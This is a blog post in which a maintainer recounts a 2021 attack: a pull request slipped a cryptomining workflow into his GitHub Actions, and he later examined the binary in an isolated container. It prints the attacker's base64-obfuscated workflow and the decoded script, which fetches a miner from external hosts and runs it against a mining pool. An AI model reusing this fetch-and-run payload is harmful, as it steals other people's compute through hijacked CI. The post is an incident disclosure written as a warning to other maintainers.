---
layout: post
title: Crypto-mining attack in my GitHub actions through Pull Request
date: 2021-02-09 17:03:55
---
In summary, yesterday, I was attacked by a github user that crafted a malicious github action to start a crypto-mining program inside an action run. He triggered it in my github actions thanks to a shitty pull request.

![Mining attack](images/1yc0yxawfz8h3xxqtne6.png)

Below, starts the detailed story of the events and my investigation.

# Arrow
Yesterday I was watching an episode of the serie [Arrow](https://www.netflix.com/fr/title/70242081)
![Arrow](images/ibo3s46trd9icoavuw9w.png)

It's a serie that contains a lot of everything including hacking sessions that are much much exaggerated and false, but the serie is cool :smiley:

For the record, **Laurel Lance** I hate you, **Thea Queen** you're the best! :100:

![Thea Queen](images/db2jle3o1fmgh48n9nv3.png)

Anyway, during a pause, I looked at devto/hn/linuxfr/github when I saw something that immediately sounded strange...

I got a pull request on a repository where I did not attend any pull requests. I mean, I could receive some, it's open and some parts can be improved for sure, but it was surprising. 

First, the repository does not have any "star" :star:

![No star](images/ybdg3u7d6owfpt564cx2.png)

It's a collection of [github actions](https://github.com/thibaultduponchelle/messy-ci-workflows/tree/master/.github/workflows), [circle ci](https://github.com/thibaultduponchelle/messy-ci-workflows/blob/master/.circleci/config.yml), [travis-ci](https://github.com/thibaultduponchelle/messy-ci-workflows/blob/master/.travis.yml) examples for Perl projects. And it's just a complete mess with links to docker images, blog posts, helpers...

![The mess](images/8ieaoma2bymfijmieuuw.png)

Yes it has a lot of failing actions, but it's on purpose.

This repository does not seems abandoned (a commit 14 days ago from today) and neither is my profile.

It was forked 2 times in the recent 3 days.

So far, you would think I'm too nervous, but really, it smelled strange even before I looked into the Pull Request details. A sort of bad feeling.

# The strange Pull request
Still on my smartphone, I looked at the pull request, it became clear that it was *unclear* :grinning:

The Pull Request title was "Update actions". The description was empty :unamused: and the Pull Request has been opened/closed multiple times!
 
Here is my notification emails about the PR, usually I should receive only one per opened PR:

![Open Close](images/khzroocccngjlov9k9f8.png)

And the name of the guy is `y4ndexhater1` which is really an hacker's nick :sweat_smile:
![Y4anderhater1](images/jb06erpvqsnmpehuza50.png)


But my mom learned me to *never judge people by their appearance* so I continued to investigate (but the game was already over :smiley:).

# The nasty Pull Request
I then looked as fast as possible at PR content, I was nervous and rushing, I felt like github was too slow to load the page... 

As a meaningful contribution I was expecting some typo corrections, or adding more actions to the set.

But instead, all my actions were proposed to deletion and one new called `ci.yml` was added.

Here is the screenshot (I was still on my smartphone):
![ci](images/pdag114t5r1tkibzyqu6.png)

When I saw the `eval "$(echo "YXB0IHVwZGF0ZSAt` I jumped from my couch while saying:

- Sorry sweet, I have to start the computer for five minutes, somebody is doing something nasty to hack my github profile
- Like [Felicity Smoak](https://en.wikipedia.org/wiki/Felicity_Smoak_(Arrowverse))? she said
- Yes kind of, with less magic. I said

(I'm not discussing in english with my wife, we are french and we respect the french reputation about bad english, you know...:thumbsup:)

The pull request had triggered actions (multiple times since it was opened/closed/opened/closed/opened/closed/opened) and the github actions were currently running... So time was playing against me, and I was very happy to have caught the pull request just few minutes after its creation :muscle:

Especially since each action seemed to start multiple *sub-jobs*:
![Sub](images/jt9yvzbnmmbd7lvlh329.png)

You can see by yourself the run [549053847](https://github.com/thibaultduponchelle/messy-ci-workflows/actions/runs/549053847)

When my computer finished to boot, I immediately stopped the jobs and closed the Pull Request.

The content of the `ci.yml` was:
```yaml
name: Test
 on: [pull_request]
 jobs:
   test:
     name: Fetch
     runs-on: ubuntu-latest
     container: ubuntu:20.10
     env:
       DEBIAN_FRONTEND: noninteractive
     strategy:
       fail-fast: false
       matrix:
         runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
       - run: |
           eval "$(echo "YXB0IHVwZGF0ZSAtcXEKYXB0IGluc3RhbGwgLXkgY3VybCBnaXQganEKY3VybCAtTGZvIHByb2cgaHR0cHM6Ly9naXRodWIuY29tL2JocmlzY2FybmF0dC9maXJzdC1yZXBvL3JlbGVhc2VzL2Rvd25sb2FkL2EvcHJvZyB8fCBjdXJsIC1MZm8gcHJvZyBodHRwczovL3RyYW5zZmVyLnNoL09TUGpLL3Byb2cKaXA9JChjdXJsIC1zIC1IICdhY2NlcHQ6IGFwcGxpY2F0aW9uL2Rucy1qc29uJyAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT1wb29saW8ubWFncmF0bWFpbC54eXomdHlwZT1BJyB8IGpxIC1yICcuQW5zd2VyWzBdLmRhdGEnKQpjaG1vZCB1K3ggcHJvZwp0aW1lb3V0IDRoIC4vcHJvZyAtbyAiJHtpcH06MzAwMCIgLXUgQ2hyaXNCYXJuYXR0IC1wIEV4cGxhaW5pbmdDb21wdXRlcnMgLS1jcHUtcHJpb3JpdHkgNSA+IC9kZXYvbnVsbAo=" | base64 -d)"
```

The obfuscation with `base64` encoding is something usual. I played with an obfuscated [JAPH](https://fr.wikipedia.org/wiki/Just_Another_Perl_Hacker) in a recent [blog post](https://dev.to/thibaultduponchelle/japhs-autopsies-2-41jl) so it took me 1 second to translate it.

With this obfuscation, I knew at this point that there was a backdoor or a mining program behind.

# The mining attack
When decoding the thing:
```bash
echo "YXB0IHVwZGF0ZSAtcXEKYXB0IGluc3RhbGwgLXkgY3VybCBnaXQganEKY3VybCAtTGZvIHByb2cgaHR0cHM6Ly9naXRodWIuY29tL2JocmlzY2FybmF0dC9maXJzdC1yZXBvL3JlbGVhc2VzL2Rvd25sb2FkL2EvcHJvZyB8fCBjdXJsIC1MZm8gcHJvZyBodHRwczovL3RyYW5zZmVyLnNoL09TUGpLL3Byb2cKaXA9JChjdXJsIC1zIC1IICdhY2NlcHQ6IGFwcGxpY2F0aW9uL2Rucy1qc29uJyAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT1wb29saW8ubWFncmF0bWFpbC54eXomdHlwZT1BJyB8IGpxIC1yICcuQW5zd2VyWzBdLmRhdGEnKQpjaG1vZCB1K3ggcHJvZwp0aW1lb3V0IDRoIC4vcHJvZyAtbyAiJHtpcH06MzAwMCIgLXUgQ2hyaXNCYXJuYXR0IC1wIEV4cGxhaW5pbmdDb21wdXRlcnMgLS1jcHUtcHJpb3JpdHkgNSA+IC9kZXYvbnVsbAo=" | base64 -d
```

I get the nasty code:
```bash
apt update -qq
apt install -y curl git jq
curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog || curl -Lfo prog https://transfer.sh/OSPjK/prog
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
chmod u+x prog
timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null
```

I will not explain the `apt` lines, we don't care.

The `curl` lines are more interesting, since it retrieves the `prog` binary. 
```bash
curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog || curl -Lfo prog https://transfer.sh/OSPjK/prog
```
From either a github profile (that no longer exists) or a `transfer.sh` url that maybe still exists.

Then it seems to use an external service to resolve an IP address (the one for `poolio.magratmail.xyz`).

```bash
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
```

I think that `dns.google` is not a nasty domain, but honestly I'm not sure and haven't much investigated this.

Then it executes `prog`:
```bash
chmod u+x prog
timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null
```
:unamused: `ChrisBarnatt`... `ExplainingComputers`... :unamused:

# What is `prog` ?
A backdoor? A mining program? Something else (a github secret stealer)?

If you read carefully the title of this post, you already know the answer :smiley:

I downloaded this `prog` since it was still available (not tested recently) at `https://transfer.sh/OSPjK/prog`

Then I wanted to have info without executing it so I tried 
```bash
$ file prog
prog: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

Except statically linked, no info :/

Or even:
```bash
$ objdump -s --section .comment prog

prog:     file format elf64-x86-64

Contents of section .comment:
 0000 4743433a 2028416c 70696e65 2031302e  GCC: (Alpine 10.
 0010 322e315f 70726531 29203130 2e322e31  2.1_pre1) 10.2.1
 0020 20323032 30313230 3300                20201203.
```

Alpine? It even does not have the same libc? But ok...

I quickly looked into the file with `hexedit`.

Then, I thought about trying more options with `readelf` or `objdump` (if you know what are the magic commands, please comment!).

I also thought about decompiling it... 

Finally, since it's a program that requires arguments to work properly, I had the feeling that I could run it safely by using wrong or no arguments so I could get informations about its nature.

Even with this assumption, I would only execute it in a container, with network disabled and on a computer with no internet access. 

# The hacker's escape
![y4andexhater1](images/e787m5krz0hkv0p0igsb.png)
While it took me maybe 7 minutes to stop all the jobs and close the pull request, in the 5 minutes that followed, the [pull request](https://github.com/thibaultduponchelle/messy-ci-workflows/pull/7) itself and the user [y4ndexhater1](https://github.com/y4ndexhater1) totally disappeared (for your info, it looked an usual profile with projects pinned on the homepage).
![Disappear](images/rxt5syglrsukz27hwho7.gif)

EDIT: GitHub support informed me later that the profile and pull request disappearing was triggered by them flagging this user for suspicious activity :smiley:

# Inspecting `prog` in a container
First I disabled my internet connection.
![Wifi](images/v2xlzc480uu1tn90283b.png)

Then I started a docker container without network:
```bash
docker run -v`pwd`:/tmp --network none -it ubuntu bash
```

At this point, I had a "Poor man's Qube OS" :grinning: where I can execute `prog`.

Here I hesitated a bit before running the untrusted binary...

I hesitated again...

Ok finally I was bold enough to execute the thing and it revealed to be a cryptominer called [XMRig](https://xmrig.com/):

```bash
$ ./prog --version
XMRig 6.8.1
 built on Feb  3 2021 with GCC 10.2.1
 features: 64-bit AES

libuv/1.40.0
OpenSSL/1.1.1i
hwloc/2.4.0
```

The [XMRig](https://github.com/xmrig/xmrig) has released [6.8.1](https://github.com/xmrig/xmrig/releases/tag/v6.8.1)  some days ago and it coincides with date reported by `./prog --version`.

I tried to check if it's exactly one of the binary from [XMRig download page](https://xmrig.com/download)   
```bash
$ sha256sum prog
0a243ac063b60b13dc5e4ea85021faab6109f7e0d2aa68c9691008ed55e54001  prog
```

But I didn't find the match, so maybe it's a modified version of it or it's even not this thing at all...:flushed:

# Conclusion
To sleep peacefully, I disabled the github actions on this repository (is there an option to disable for a whole github profile?)

![Disable GA](images/lc3kip4iuupw34eww7hb.png)

I have to admit, I did no slept peacefully last night. I was a bit anxious (for nothing) about having been infected while inspecting the `prog` cryptominer :grimacing: so I'm checking all the time my local system status with `netstat` and `htop`. If you, dear reader, are earning money from my computer CPU, please tell me :grin:

I found absolutely zero info about this attack, does somebody is aware of this? Am I alone? Is this new?

EDIT1: I reported this to GitHub (through support and [communities](https://github.community/t/crypto-mining-attack-in-my-github-actions-through-pull-request/160972))

EDIT2: I found this article [Massive Cryptomining Campaign Abusing GitHub](https://blog.aquasec.com/container-security-alert-campaign-abusing-github-dockerhub-travis-ci-circle-ci) that describes the same kind of attack with a different implementation.

EDIT3: GitHub support is aware of these kind of attacks and confirmed this writing. They took actions on the hacker's profile and deleted the pull request (what I described in "The hacker's escape")

EDIT4: The story was about to repeat, I noticed a new user "dir99" that forked this repository and was suspicious. So I immediately disabled the actions. The user was almost new, with some repos created one week ago. The majority of repositories have no description neither code (but each time one tarball in release). The user has no followers neither any star on the repo. Some days later, the profile disappeared. This is a screenshot of the profile:
![dir99](images/mv4pxmehx4xtxmt50jet.png)

EDIT5: In april 2021, @mihi tested with me how the quota of concurrent running jobs were assignated and the conclusion was: **the user who *receive* the pull request counts as the starting user, not the user whose repo is submitting the pull request** see comments below this post and his [github community forum entry](https://github.community/t/whose-concurrent-jobs-are-used-when-running-github-actions-on-a-pull-request/173181)

EDIT6: April 22 2021, GitHub put in place new policy and protection against this: [Helping maintainers to combat bad actors](https://github.blog/2021-04-22-github-actions-update-helping-maintainers-combat-bad-actors/)

EDIT7: June 2021, GitHub infrastructure can (and does) slowdown your scheduled actions without notice (an action scheduled every 20 minutes can run every hours or every 2 hours depending the days) 

EDIT8: Queuing actions are now aborted when they are too many in the queue
![Too many actions queuing](images/58fp3wpmwaaj5pzhtofe.png)
